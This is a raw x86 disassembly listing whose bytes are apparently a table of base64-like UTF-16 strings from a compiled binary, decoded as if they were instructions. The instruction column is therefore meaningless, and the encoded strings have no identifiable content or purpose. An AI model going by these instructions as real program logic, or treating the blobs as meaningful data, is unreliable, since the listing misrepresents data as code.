  40b171:	68 00 33 00 57       	push   $0x57003300
  40b176:	00 67 00             	add    %ah,0x0(%edi)
  40b179:	5a                   	pop    %edx
  40b17a:	00 6d 00             	add    %ch,0x0(%ebp)
  40b17d:	32 00                	xor    (%eax),%al
  40b17f:	76 00                	jbe    0x40b181
  40b181:	4b                   	dec    %ebx
  40b182:	00 52 00             	add    %dl,0x0(%edx)
  40b185:	33 00                	xor    (%eax),%eax
  40b187:	54                   	push   %esp
  40b188:	00 43 00             	add    %al,0x0(%ebx)
  40b18b:	57                   	push   %edi
  40b18c:	00 36                	add    %dh,(%esi)
  40b18e:	00 51 00             	add    %dl,0x0(%ecx)
  40b191:	35 00 31 00 6c       	xor    $0x6c003100,%eax
  40b196:	00 43 00             	add    %al,0x0(%ebx)
  40b199:	4b                   	dec    %ebx
  40b19a:	00 70 00             	add    %dh,0x0(%eax)
  40b19d:	37                   	aaa
  40b19e:	00 56 00             	add    %dl,0x0(%esi)
  40b1a1:	52                   	push   %edx
  40b1a2:	00 47 00             	add    %al,0x0(%edi)
  40b1a5:	67 00 36 00 54       	add    %dh,0x5400
  40b1aa:	00 2f                	add    %ch,(%edi)
  40b1ac:	00 4e 00             	add    %cl,0x0(%esi)
  40b1af:	75 00                	jne    0x40b1b1
  40b1b1:	38 00                	cmp    %al,(%eax)
  40b1b3:	69 00 71 00 68 00    	imul   $0x680071,(%eax),%eax
  40b1b9:	38 00                	cmp    %al,(%eax)
  40b1bb:	45                   	inc    %ebp
  40b1bc:	00 2f                	add    %ch,(%edi)
  40b1be:	00 50 00             	add    %dl,0x0(%eax)
  40b1c1:	78 00                	js     0x40b1c3
  40b1c3:	64 00 68 00          	add    %ch,%fs:0x0(%eax)
  40b1c7:	56                   	push   %esi
  40b1c8:	00 58 00             	add    %bl,0x0(%eax)
  40b1cb:	51                   	push   %ecx
  40b1cc:	00 46 00             	add    %al,0x0(%esi)
  40b1cf:	4c                   	dec    %esp
  40b1d0:	00 53 00             	add    %dl,0x0(%ebx)
  40b1d3:	50                   	push   %eax
  40b1d4:	00 7a 00             	add    %bh,0x0(%edx)
  40b1d7:	46                   	inc    %esi
  40b1d8:	00 33                	add    %dh,(%ebx)
  40b1da:	00 49 00             	add    %cl,0x0(%ecx)
  40b1dd:	32 00                	xor    (%eax),%al
  40b1df:	55                   	push   %ebp
  40b1e0:	00 33                	add    %dh,(%ebx)
  40b1e2:	00 70 00             	add    %dh,0x0(%eax)
  40b1e5:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1e6:	00 5a 00             	add    %bl,0x0(%edx)
  40b1e9:	39 00                	cmp    %eax,(%eax)
  40b1eb:	70 00                	jo     0x40b1ed
  40b1ed:	51                   	push   %ecx
  40b1ee:	00 6a 00             	add    %ch,0x0(%edx)
  40b1f1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1f2:	00 63 00             	add    %ah,0x0(%ebx)
  40b1f5:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40b1f9:	61                   	popa
  40b1fa:	00 66 00             	add    %ah,0x0(%esi)
  40b1fd:	5a                   	pop    %edx
  40b1fe:	00 2f                	add    %ch,(%edi)
  40b200:	00 2f                	add    %ch,(%edi)
  40b202:	00 79 00             	add    %bh,0x0(%ecx)
  40b205:	4e                   	dec    %esi
  40b206:	00 50 00             	add    %dl,0x0(%eax)
  40b209:	55                   	push   %ebp
  40b20a:	00 4b 00             	add    %cl,0x0(%ebx)
  40b20d:	4f                   	dec    %edi
  40b20e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b211:	51                   	push   %ecx
  40b212:	00 63 00             	add    %ah,0x0(%ebx)
  40b215:	62 00                	bound  %eax,(%eax)
  40b217:	68 00 4a 00 75       	push   $0x75004a00
  40b21c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b21f:	69 00 62 00 38 00    	imul   $0x380062,(%eax),%eax
  40b225:	65 00 64 00 41       	add    %ah,%gs:0x41(%eax,%eax,1)
  40b22a:	00 4d 00             	add    %cl,0x0(%ebp)
  40b22d:	32 00                	xor    (%eax),%al
  40b22f:	44                   	inc    %esp
  40b230:	00 37                	add    %dh,(%edi)
  40b232:	00 42 00             	add    %al,0x0(%edx)
  40b235:	37                   	aaa
  40b236:	00 62 00             	add    %ah,0x0(%edx)
  40b239:	70 00                	jo     0x40b23b
  40b23b:	75 00                	jne    0x40b23d
  40b23d:	77 00                	ja     0x40b23f
  40b23f:	55                   	push   %ebp
  40b240:	00 63 00             	add    %ah,0x0(%ebx)
  40b243:	77 00                	ja     0x40b245
  40b245:	73 00                	jae    0x40b247
  40b247:	43                   	inc    %ebx
  40b248:	00 5a 00             	add    %bl,0x0(%edx)
  40b24b:	41                   	inc    %ecx
  40b24c:	00 4f 00             	add    %cl,0x0(%edi)
  40b24f:	33 00                	xor    (%eax),%eax
  40b251:	66 00 2b             	data16 add %ch,(%ebx)
  40b254:	00 58 00             	add    %bl,0x0(%eax)
  40b257:	6f                   	outsl  %ds:(%esi),(%dx)
  40b258:	00 74 00 43          	add    %dh,0x43(%eax,%eax,1)
  40b25c:	00 55 00             	add    %dl,0x0(%ebp)
  40b25f:	42                   	inc    %edx
  40b260:	00 79 00             	add    %bh,0x0(%ecx)
  40b263:	41                   	inc    %ecx
  40b264:	00 66 00             	add    %ah,0x0(%esi)
  40b267:	6e                   	outsb  %ds:(%esi),(%dx)
  40b268:	00 37                	add    %dh,(%edi)
  40b26a:	00 32                	add    %dh,(%edx)
  40b26c:	00 61 00             	add    %ah,0x0(%ecx)
  40b26f:	41                   	inc    %ecx
  40b270:	00 52 00             	add    %dl,0x0(%edx)
  40b273:	41                   	inc    %ecx
  40b274:	00 2f                	add    %ch,(%edi)
  40b276:	00 69 00             	add    %ch,0x0(%ecx)
  40b279:	68 00 48 00 4a       	push   $0x4a004800
  40b27e:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
  40b282:	00 55 00             	add    %dl,0x0(%ebp)
  40b285:	2b 00                	sub    (%eax),%eax
  40b287:	76 00                	jbe    0x40b289
  40b289:	59                   	pop    %ecx
  40b28a:	00 31                	add    %dh,(%ecx)
  40b28c:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  40b290:	00 4a 00             	add    %cl,0x0(%edx)
  40b293:	75 00                	jne    0x40b295
  40b295:	73 00                	jae    0x40b297
  40b297:	7a 00                	jp     0x40b299
  40b299:	61                   	popa
  40b29a:	00 57 00             	add    %dl,0x0(%edi)
  40b29d:	2f                   	das
  40b29e:	00 76 00             	add    %dh,0x0(%esi)
  40b2a1:	2b 00                	sub    (%eax),%eax
  40b2a3:	70 00                	jo     0x40b2a5
  40b2a5:	45                   	inc    %ebp
  40b2a6:	00 74 00 44          	add    %dh,0x44(%eax,%eax,1)
  40b2aa:	00 43 00             	add    %al,0x0(%ebx)
  40b2ad:	33 00                	xor    (%eax),%eax
  40b2af:	4e                   	dec    %esi
  40b2b0:	00 69 00             	add    %ch,0x0(%ecx)
  40b2b3:	59                   	pop    %ecx
  40b2b4:	00 5a 00             	add    %bl,0x0(%edx)
  40b2b7:	51                   	push   %ecx
  40b2b8:	00 58 00             	add    %bl,0x0(%eax)
  40b2bb:	6b 00 32             	imul   $0x32,(%eax),%eax
  40b2be:	00 35 00 65 00 4d    	add    %dh,0x4d006500
  40b2c4:	00 4f 00             	add    %cl,0x0(%edi)
  40b2c7:	4f                   	dec    %edi
  40b2c8:	00 38                	add    %bh,(%eax)
  40b2ca:	00 72 00             	add    %dh,0x0(%edx)
  40b2cd:	2b 00                	sub    (%eax),%eax
  40b2cf:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  40b2d3:	67 00 67 00          	add    %ah,0x0(%bx)
  40b2d7:	72 00                	jb     0x40b2d9
  40b2d9:	59                   	pop    %ecx
  40b2da:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
  40b2de:	00 48 00             	add    %cl,0x0(%eax)
  40b2e1:	69 00 6d 00 34 00    	imul   $0x34006d,(%eax),%eax
  40b2e7:	63 00                	arpl   %eax,(%eax)
  40b2e9:	4a                   	dec    %edx
  40b2ea:	00 69 00             	add    %ch,0x0(%ecx)
  40b2ed:	63 00                	arpl   %eax,(%eax)
  40b2ef:	51                   	push   %ecx
  40b2f0:	00 59 00             	add    %bl,0x0(%ecx)
  40b2f3:	47                   	inc    %edi
  40b2f4:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b2f7:	6c                   	insb   (%dx),%es:(%edi)
  40b2f8:	00 62 00             	add    %ah,0x0(%edx)
  40b2fb:	48                   	dec    %eax
  40b2fc:	00 53 00             	add    %dl,0x0(%ebx)
  40b2ff:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40b303:	54                   	push   %esp
  40b304:	00 52 00             	add    %dl,0x0(%edx)
  40b307:	4d                   	dec    %ebp
  40b308:	00 30                	add    %dh,(%eax)
  40b30a:	00 33                	add    %dh,(%ebx)
  40b30c:	00 77 00             	add    %dh,0x0(%edi)
  40b30f:	52                   	push   %edx
  40b310:	00 38                	add    %bh,(%eax)
  40b312:	00 6b 00             	add    %ch,0x0(%ebx)
  40b315:	73 00                	jae    0x40b317
  40b317:	61                   	popa
  40b318:	00 73 00             	add    %dh,0x0(%ebx)
  40b31b:	59                   	pop    %ecx
  40b31c:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b320:	00 73 00             	add    %dh,0x0(%ebx)
  40b323:	73 00                	jae    0x40b325
  40b325:	59                   	pop    %ecx
  40b326:	00 48 00             	add    %cl,0x0(%eax)
  40b329:	51                   	push   %ecx
  40b32a:	00 33                	add    %dh,(%ebx)
  40b32c:	00 69 00             	add    %ch,0x0(%ecx)
  40b32f:	4c                   	dec    %esp
  40b330:	00 6f 00             	add    %ch,0x0(%edi)
  40b333:	4d                   	dec    %ebp
  40b334:	00 7a 00             	add    %bh,0x0(%edx)
  40b337:	35 00 61 00 6b       	xor    $0x6b006100,%eax
  40b33c:	00 41 00             	add    %al,0x0(%ecx)
  40b33f:	70 00                	jo     0x40b341
  40b341:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40b345:	77 00                	ja     0x40b347
  40b347:	38 00                	cmp    %al,(%eax)
  40b349:	71 00                	jno    0x40b34b
  40b34b:	72 00                	jb     0x40b34d
  40b34d:	31 00                	xor    %eax,(%eax)
  40b34f:	2b 00                	sub    (%eax),%eax
  40b351:	61                   	popa
  40b352:	00 53 00             	add    %dl,0x0(%ebx)
  40b355:	61                   	popa
  40b356:	00 4c 00 67          	add    %cl,0x67(%eax,%eax,1)
  40b35a:	00 6b 00             	add    %ch,0x0(%ebx)
  40b35d:	61                   	popa
  40b35e:	00 79 00             	add    %bh,0x0(%ecx)
  40b361:	64 00 36             	add    %dh,%fs:(%esi)
  40b364:	00 4f 00             	add    %cl,0x0(%edi)
  40b367:	34 00                	xor    $0x0,%al
  40b369:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40b36d:	4f                   	dec    %edi
  40b36e:	00 35 00 4f 00 6b    	add    %dh,0x6b004f00
  40b374:	00 79 00             	add    %bh,0x0(%ecx)
  40b377:	6d                   	insl   (%dx),%es:(%edi)
  40b378:	00 75 00             	add    %dh,0x0(%ebp)
  40b37b:	67 00 57 00          	add    %dl,0x0(%bx)
  40b37f:	63 00                	arpl   %eax,(%eax)
  40b381:	41                   	inc    %ecx
  40b382:	00 59 00             	add    %bl,0x0(%ecx)
  40b385:	4c                   	dec    %esp
  40b386:	00 79 00             	add    %bh,0x0(%ecx)
  40b389:	46                   	inc    %esi
  40b38a:	00 6e 00             	add    %ch,0x0(%esi)
  40b38d:	42                   	inc    %edx
  40b38e:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  40b392:	00 61 00             	add    %ah,0x0(%ecx)
  40b395:	63 00                	arpl   %eax,(%eax)
  40b397:	54                   	push   %esp
  40b398:	00 31                	add    %dh,(%ecx)
  40b39a:	00 2b                	add    %ch,(%ebx)
  40b39c:	00 67 00             	add    %ah,0x0(%edi)
  40b39f:	41                   	inc    %ecx
  40b3a0:	00 51 00             	add    %dl,0x0(%ecx)
  40b3a3:	44                   	inc    %esp
  40b3a4:	00 2b                	add    %ch,(%ebx)
  40b3a6:	00 35 00 6b 00 32    	add    %dh,0x32006b00
  40b3ac:	00 6e 00             	add    %ch,0x0(%esi)
  40b3af:	6d                   	insl   (%dx),%es:(%edi)
  40b3b0:	00 50 00             	add    %dl,0x0(%eax)
  40b3b3:	4e                   	dec    %esi
  40b3b4:	00 79 00             	add    %bh,0x0(%ecx)
  40b3b7:	4c                   	dec    %esp
  40b3b8:	00 57 00             	add    %dl,0x0(%edi)
  40b3bb:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3bc:	00 37                	add    %dh,(%edi)
  40b3be:	00 63 00             	add    %ah,0x0(%ebx)
  40b3c1:	79 00                	jns    0x40b3c3
  40b3c3:	74 00                	je     0x40b3c5
  40b3c5:	53                   	push   %ebx
  40b3c6:	00 47 00             	add    %al,0x0(%edi)
  40b3c9:	55                   	push   %ebp
  40b3ca:	00 57 00             	add    %dl,0x0(%edi)
  40b3cd:	76 00                	jbe    0x40b3cf
  40b3cf:	4c                   	dec    %esp
  40b3d0:	00 61 00             	add    %ah,0x0(%ecx)
  40b3d3:	75 00                	jne    0x40b3d5
  40b3d5:	77 00                	ja     0x40b3d7
  40b3d7:	71 00                	jno    0x40b3d9
  40b3d9:	51                   	push   %ecx
  40b3da:	00 6f 00             	add    %ch,0x0(%edi)
  40b3dd:	72 00                	jb     0x40b3df
  40b3df:	69 00 30 00 38 00    	imul   $0x380030,(%eax),%eax
  40b3e5:	76 00                	jbe    0x40b3e7
  40b3e7:	35 00 53 00 61       	xor    $0x61005300,%eax
  40b3ec:	00 49 00             	add    %cl,0x0(%ecx)
  40b3ef:	4d                   	dec    %ebp
  40b3f0:	00 55 00             	add    %dl,0x0(%ebp)
  40b3f3:	6c                   	insb   (%dx),%es:(%edi)
  40b3f4:	00 7a 00             	add    %bh,0x0(%edx)
  40b3f7:	75 00                	jne    0x40b3f9
  40b3f9:	67 00 37             	add    %dh,(%bx)
  40b3fc:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b3ff:	50                   	push   %eax
  40b400:	00 69 00             	add    %ch,0x0(%ecx)
  40b403:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40b407:	59                   	pop    %ecx
  40b408:	00 48 00             	add    %cl,0x0(%eax)
  40b40b:	51                   	push   %ecx
  40b40c:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b412:	80 b1 66 00 4e 00 35 	xorb   $0x35,0x4e0066(%ecx)
  40b419:	00 4f 00             	add    %cl,0x0(%edi)
  40b41c:	72 00                	jb     0x40b41e
  40b41e:	54                   	push   %esp
  40b41f:	00 55 00             	add    %dl,0x0(%ebp)
  40b422:	56                   	push   %esi
  40b423:	00 49 00             	add    %cl,0x0(%ecx)
  40b426:	67 00 32             	add    %dh,(%bp,%si)
  40b429:	00 42 00             	add    %al,0x0(%edx)
  40b42c:	75 00                	jne    0x40b42e
  40b42e:	72 00                	jb     0x40b430
  40b430:	47                   	inc    %edi
  40b431:	00 76 00             	add    %dh,0x0(%esi)
  40b434:	30 00                	xor    %al,(%eax)
  40b436:	6a 00                	push   $0x0
  40b438:	6e                   	outsb  %ds:(%esi),(%dx)
  40b439:	00 61 00             	add    %ah,0x0(%ecx)
  40b43c:	7a 00                	jp     0x40b43e
  40b43e:	74 00                	je     0x40b440
  40b440:	57                   	push   %edi
  40b441:	00 47 00             	add    %al,0x0(%edi)
  40b444:	56                   	push   %esi
  40b445:	00 63 00             	add    %ah,0x0(%ebx)
  40b448:	6c                   	insb   (%dx),%es:(%edi)
  40b449:	00 67 00             	add    %ah,0x0(%edi)
  40b44c:	72 00                	jb     0x40b44e
  40b44e:	65 00 36             	add    %dh,%gs:(%esi)
  40b451:	00 69 00             	add    %ch,0x0(%ecx)
  40b454:	34 00                	xor    $0x0,%al
  40b456:	44                   	inc    %esp
  40b457:	00 69 00             	add    %ch,0x0(%ecx)
  40b45a:	69 00 69 00 41 00    	imul   $0x410069,(%eax),%eax
  40b460:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40b464:	45                   	inc    %ebp
  40b465:	00 68 00             	add    %ch,0x0(%eax)
  40b468:	57                   	push   %edi
  40b469:	00 49 00             	add    %cl,0x0(%ecx)
  40b46c:	31 00                	xor    %eax,(%eax)
  40b46e:	76 00                	jbe    0x40b470
  40b470:	77 00                	ja     0x40b472
  40b472:	4e                   	dec    %esi
  40b473:	00 59 00             	add    %bl,0x0(%ecx)
  40b476:	32 00                	xor    (%eax),%al
  40b478:	5a                   	pop    %edx
  40b479:	00 78 00             	add    %bh,0x0(%eax)
  40b47c:	37                   	aaa
  40b47d:	00 63 00             	add    %ah,0x0(%ebx)
  40b480:	77 00                	ja     0x40b482
  40b482:	2f                   	das
  40b483:	00 32                	add    %dh,(%edx)
  40b485:	00 42 00             	add    %al,0x0(%edx)
  40b488:	4b                   	dec    %ebx
  40b489:	00 59 00             	add    %bl,0x0(%ecx)
  40b48c:	50                   	push   %eax
  40b48d:	00 36                	add    %dh,(%esi)
  40b48f:	00 52 00             	add    %dl,0x0(%edx)
  40b492:	36 00 36             	add    %dh,%ss:(%esi)
  40b495:	00 46 00             	add    %al,0x0(%esi)
  40b498:	49                   	dec    %ecx
  40b499:	00 4a 00             	add    %cl,0x0(%edx)
  40b49c:	44                   	inc    %esp
  40b49d:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  40b4a1:	00 55 00             	add    %dl,0x0(%ebp)
  40b4a4:	39 00                	cmp    %eax,(%eax)
  40b4a6:	41                   	inc    %ecx
  40b4a7:	00 57 00             	add    %dl,0x0(%edi)
  40b4aa:	31 00                	xor    %eax,(%eax)
  40b4ac:	4e                   	dec    %esi
  40b4ad:	00 78 00             	add    %bh,0x0(%eax)
  40b4b0:	51                   	push   %ecx
  40b4b1:	00 66 00             	add    %ah,0x0(%esi)
  40b4b4:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b4b8:	72 00                	jb     0x40b4ba
  40b4ba:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  40b4be:	51                   	push   %ecx
  40b4bf:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b4c5:	80 b1 30 00 41 00 72 	xorb   $0x72,0x410030(%ecx)
  40b4cc:	00 49 00             	add    %cl,0x0(%ecx)
  40b4cf:	65 00 32             	add    %dh,%gs:(%edx)
  40b4d2:	00 61 00             	add    %ah,0x0(%ecx)
  40b4d5:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  40b4d9:	2f                   	das
  40b4da:	00 37                	add    %dh,(%edi)
  40b4dc:	00 69 00             	add    %ch,0x0(%ecx)
  40b4df:	4e                   	dec    %esi
  40b4e0:	00 6a 00             	add    %ch,0x0(%edx)
  40b4e3:	44                   	inc    %esp
  40b4e4:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  40b4e8:	00 53 00             	add    %dl,0x0(%ebx)
  40b4eb:	4f                   	dec    %edi
  40b4ec:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b4ef:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  40b4f3:	38 00                	cmp    %al,(%eax)
  40b4f5:	61                   	popa
  40b4f6:	00 65 00             	add    %ah,0x0(%ebp)
  40b4f9:	35 00 61 00 46       	xor    $0x46006100,%eax
  40b4fe:	00 30                	add    %dh,(%eax)
  40b500:	00 79 00             	add    %bh,0x0(%ecx)
  40b503:	61                   	popa
  40b504:	00 48 00             	add    %cl,0x0(%eax)
  40b507:	38 00                	cmp    %al,(%eax)
  40b509:	6a 00                	push   $0x0
  40b50b:	44                   	inc    %esp
  40b50c:	00 73 00             	add    %dh,0x0(%ebx)
  40b50f:	77 00                	ja     0x40b511
  40b511:	48                   	dec    %eax
  40b512:	00 55 00             	add    %dl,0x0(%ebp)
  40b515:	53                   	push   %ebx
  40b516:	00 41 00             	add    %al,0x0(%ecx)
  40b519:	73 00                	jae    0x40b51b
  40b51b:	37                   	aaa
  40b51c:	00 4d 00             	add    %cl,0x0(%ebp)
  40b51f:	57                   	push   %edi
  40b520:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b523:	45                   	inc    %ebp
  40b524:	00 68 00             	add    %ch,0x0(%eax)
  40b527:	78 00                	js     0x40b529
  40b529:	45                   	inc    %ebp
  40b52a:	00 4f 00             	add    %cl,0x0(%edi)
  40b52d:	48                   	dec    %eax
  40b52e:	00 51 00             	add    %dl,0x0(%ecx)
  40b531:	71 00                	jno    0x40b533
  40b533:	4b                   	dec    %ebx
  40b534:	00 49 00             	add    %cl,0x0(%ecx)
  40b537:	41                   	inc    %ecx
  40b538:	00 61 00             	add    %ah,0x0(%ecx)
  40b53b:	34 00                	xor    $0x0,%al
  40b53d:	32 00                	xor    (%eax),%al
  40b53f:	54                   	push   %esp
  40b540:	00 2f                	add    %ch,(%edi)
  40b542:	00 75 00             	add    %dh,0x0(%ebp)
  40b545:	55                   	push   %ebp
  40b546:	00 6e 00             	add    %ch,0x0(%esi)
  40b549:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40b54d:	47                   	inc    %edi
  40b54e:	00 50 00             	add    %dl,0x0(%eax)
  40b551:	7a 00                	jp     0x40b553
  40b553:	37                   	aaa
  40b554:	00 30                	add    %dh,(%eax)
  40b556:	00 63 00             	add    %ah,0x0(%ebx)
  40b559:	6f                   	outsl  %ds:(%esi),(%dx)
  40b55a:	00 52 00             	add    %dl,0x0(%edx)
  40b55d:	55                   	push   %ebp
  40b55e:	00 62 00             	add    %ah,0x0(%edx)
  40b561:	43                   	inc    %ebx
  40b562:	00 4f 00             	add    %cl,0x0(%edi)
  40b565:	69 00 32 00 76 00    	imul   $0x760032,(%eax),%eax
  40b56b:	42                   	inc    %edx
  40b56c:	00 4f 00             	add    %cl,0x0(%edi)
  40b56f:	69 00 77 00 3d 00    	imul   $0x3d0077,(%eax),%eax
  40b575:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  40b57a:	62 00                	bound  %eax,(%eax)
  40b57c:	33 00                	xor    (%eax),%eax
  40b57e:	45                   	inc    %ebp
  40b57f:	00 4a 00             	add    %cl,0x0(%edx)
  40b582:	53                   	push   %ebx
  40b583:	00 48 00             	add    %cl,0x0(%eax)
  40b586:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  40b589:	00 46 00             	add    %al,0x0(%esi)
  40b58c:	45                   	inc    %ebp
  40b58d:	00 4e 00             	add    %cl,0x0(%esi)
  40b590:	33 00                	xor    (%eax),%eax
  40b592:	66 00 35 00 48 00 76 	data16 add %dh,0x76004800
  40b599:	00 4f 00             	add    %cl,0x0(%edi)
  40b59c:	58                   	pop    %eax
  40b59d:	00 4e 00             	add    %cl,0x0(%esi)
  40b5a0:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40b5a4:	30 00                	xor    %al,(%eax)
  40b5a6:	63 00                	arpl   %eax,(%eax)
  40b5a8:	58                   	pop    %eax
  40b5a9:	00 30                	add    %dh,(%eax)
  40b5ab:	00 62 00             	add    %ah,0x0(%edx)
  40b5ae:	58                   	pop    %eax
  40b5af:	00 75 00             	add    %dh,0x0(%ebp)
  40b5b2:	34 00                	xor    $0x0,%al
  40b5b4:	2f                   	das
  40b5b5:	00 54 00 53          	add    %dl,0x53(%eax,%eax,1)
  40b5b9:	00 42 00             	add    %al,0x0(%edx)
  40b5bc:	73 00                	jae    0x40b5be
  40b5be:	62 00                	bound  %eax,(%eax)
  40b5c0:	75 00                	jne    0x40b5c2
  40b5c2:	30 00                	xor    %al,(%eax)
  40b5c4:	5a                   	pop    %edx
  40b5c5:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b5c8:	41                   	inc    %ecx
  40b5c9:	00 52 00             	add    %dl,0x0(%edx)
  40b5cc:	34 00                	xor    $0x0,%al
  40b5ce:	6d                   	insl   (%dx),%es:(%edi)
  40b5cf:	00 48 00             	add    %cl,0x0(%eax)
  40b5d2:	78 00                	js     0x40b5d4
  40b5d4:	32 00                	xor    (%eax),%al
  40b5d6:	2f                   	das
  40b5d7:	00 4a 00             	add    %cl,0x0(%edx)
  40b5da:	48                   	dec    %eax
  40b5db:	00 77 00             	add    %dh,0x0(%edi)
  40b5de:	69 00 46 00 43 00    	imul   $0x430046,(%eax),%eax
  40b5e4:	53                   	push   %ebx
  40b5e5:	00 41 00             	add    %al,0x0(%ecx)
  40b5e8:	41                   	inc    %ecx
  40b5e9:	00 55 00             	add    %dl,0x0(%ebp)
  40b5ec:	74 00                	je     0x40b5ee
  40b5ee:	45                   	inc    %ebp
  40b5ef:	00 6d 00             	add    %ch,0x0(%ebp)
  40b5f2:	39 00                	cmp    %eax,(%eax)
  40b5f4:	63 00                	arpl   %eax,(%eax)
  40b5f6:	57                   	push   %edi
  40b5f7:	00 31                	add    %dh,(%ecx)
  40b5f9:	00 68 00             	add    %ch,0x0(%eax)
  40b5fc:	74 00                	je     0x40b5fe
  40b5fe:	57                   	push   %edi
  40b5ff:	00 36                	add    %dh,(%esi)
  40b601:	00 75 00             	add    %dh,0x0(%ebp)
  40b604:	52                   	push   %edx
  40b605:	00 7a 00             	add    %bh,0x0(%edx)
  40b608:	50                   	push   %eax
  40b609:	00 55 00             	add    %dl,0x0(%ebp)
  40b60c:	4c                   	dec    %esp
  40b60d:	00 41 00             	add    %al,0x0(%ecx)
  40b610:	74 00                	je     0x40b612
  40b612:	35 00 66 00 74       	xor    $0x74006600,%eax
  40b617:	00 54 00 34          	add    %dl,0x34(%eax,%eax,1)
  40b61b:	00 31                	add    %dh,(%ecx)
  40b61d:	00 4e 00             	add    %cl,0x0(%esi)
  40b620:	4b                   	dec    %ebx
  40b621:	00 45 00             	add    %al,0x0(%ebp)
  40b624:	41                   	inc    %ecx
  40b625:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b62b:	03 33                	add    (%ebx),%esi
  40b62d:	00 00                	add    %al,(%eax)
  40b62f:	80 b1 74 00 58 00 2f 	xorb   $0x2f,0x580074(%ecx)
  40b636:	00 2f                	add    %ch,(%edi)
  40b638:	00 57 00             	add    %dl,0x0(%edi)
  40b63b:	71 00                	jno    0x40b63d
  40b63d:	76 00                	jbe    0x40b63f
  40b63f:	59                   	pop    %ecx
  40b640:	00 2f                	add    %ch,(%edi)
  40b642:	00 32                	add    %dh,(%edx)
  40b644:	00 67 00             	add    %ah,0x0(%edi)
  40b647:	68 00 6c 00 69       	push   $0x69006c00
  40b64c:	00 36                	add    %dh,(%esi)
  40b64e:	00 4d 00             	add    %cl,0x0(%ebp)
  40b651:	4a                   	dec    %edx
  40b652:	00 65 00             	add    %ah,0x0(%ebp)
  40b655:	72 00                	jb     0x40b657
  40b657:	2f                   	das
  40b658:	00 2b                	add    %ch,(%ebx)
  40b65a:	00 37                	add    %dh,(%edi)
  40b65c:	00 2f                	add    %ch,(%edi)
  40b65e:	00 51 00             	add    %dl,0x0(%ecx)
  40b661:	31 00                	xor    %eax,(%eax)
  40b663:	43                   	inc    %ebx
  40b664:	00 58 00             	add    %bl,0x0(%eax)
  40b667:	47                   	inc    %edi
  40b668:	00 57 00             	add    %dl,0x0(%edi)
  40b66b:	58                   	pop    %eax
  40b66c:	00 49 00             	add    %cl,0x0(%ecx)
  40b66f:	46                   	inc    %esi
  40b670:	00 56 00             	add    %dl,0x0(%esi)
  40b673:	62 00                	bound  %eax,(%eax)
  40b675:	4a                   	dec    %edx
  40b676:	00 68 00             	add    %ch,0x0(%eax)
  40b679:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  40b67d:	58                   	pop    %eax
  40b67e:	00 56 00             	add    %dl,0x0(%esi)
  40b681:	79 00                	jns    0x40b683
  40b683:	65 00 74 00 6d       	add    %dh,%gs:0x6d(%eax,%eax,1)
  40b688:	00 38                	add    %bh,(%eax)
  40b68a:	00 32                	add    %dh,(%edx)
  40b68c:	00 76 00             	add    %dh,0x0(%esi)
  40b68f:	6d                   	insl   (%dx),%es:(%edi)
  40b690:	00 30                	add    %dh,(%eax)
  40b692:	00 46 00             	add    %al,0x0(%esi)
  40b695:	77 00                	ja     0x40b697
  40b697:	4a                   	dec    %edx
  40b698:	00 79 00             	add    %bh,0x0(%ecx)
  40b69b:	36 00 37             	add    %dh,%ss:(%edi)
  40b69e:	00 4d 00             	add    %cl,0x0(%ebp)
  40b6a1:	75 00                	jne    0x40b6a3
  40b6a3:	53                   	push   %ebx
  40b6a4:	00 71 00             	add    %dh,0x0(%ecx)
  40b6a7:	63 00                	arpl   %eax,(%eax)
  40b6a9:	4e                   	dec    %esi
  40b6aa:	00 33                	add    %dh,(%ebx)
  40b6ac:	00 4f 00             	add    %cl,0x0(%edi)
  40b6af:	77 00                	ja     0x40b6b1
  40b6b1:	56                   	push   %esi
  40b6b2:	00 4e 00             	add    %cl,0x0(%esi)
  40b6b5:	58                   	pop    %eax
  40b6b6:	00 6d 00             	add    %ch,0x0(%ebp)
  40b6b9:	6b 00 30             	imul   $0x30,(%eax),%eax
  40b6bc:	00 43 00             	add    %al,0x0(%ebx)
  40b6bf:	2b 00                	sub    (%eax),%eax
  40b6c1:	2b 00                	sub    (%eax),%eax
  40b6c3:	77 00                	ja     0x40b6c5
  40b6c5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b6c9:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40b6cd:	30 00                	xor    %al,(%eax)
  40b6cf:	59                   	pop    %ecx
  40b6d0:	00 5a 00             	add    %bl,0x0(%edx)
  40b6d3:	57                   	push   %edi
  40b6d4:	00 6d 00             	add    %ch,0x0(%ebp)
